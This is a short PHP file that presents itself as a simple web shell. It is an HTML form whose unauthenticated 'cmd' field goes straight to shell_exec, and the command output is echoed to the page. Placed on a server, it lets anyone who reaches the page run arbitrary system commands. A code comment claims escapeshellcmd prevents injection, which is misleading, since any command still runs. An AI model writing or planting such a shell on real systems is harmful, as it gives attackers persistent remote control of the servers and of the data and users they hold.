//simple web shell implemtation in PHP

<html>
<body>
<form method="GET" name="cmdform">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    // Check if the "cmd" parameter is set in the query string
    if(isset($_GET['cmd']))
    {
        // Sanitize the user input to prevent injections
        $cmd = escapeshellcmd($_GET['cmd']);

        // Execute the command and capture the output
        $output = shell_exec($cmd);

        // Check if the command produced any output
        if(!empty($output))
        {
            // Print the output
            echo $output;
        }
        else
        {
            // Print a message if the command produced no output
            echo "The command did not produce any output.";
        }
    }
?>
</pre>
</body>
</html>

